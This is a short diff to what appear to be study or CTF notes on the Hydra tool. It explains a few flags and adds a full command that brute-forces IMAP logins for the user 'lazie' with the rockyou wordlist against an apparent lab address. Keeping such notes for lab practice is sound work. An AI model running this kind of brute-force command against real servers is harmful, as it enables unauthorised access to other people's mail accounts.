@@ -4,3 +4,8 @@
 # -s PORT   # 	Use in case of non-default service port number
 # -V or -vV	  # Show the username and password combinations being tried
 # -d	  #  Display debugging output if the verbose output is not helping
+
+
+## IMAP 
+
+     hydra -l lazie -P /usr/share/wordlists/rockyou.txt -f 10.10.236.254 imap -v
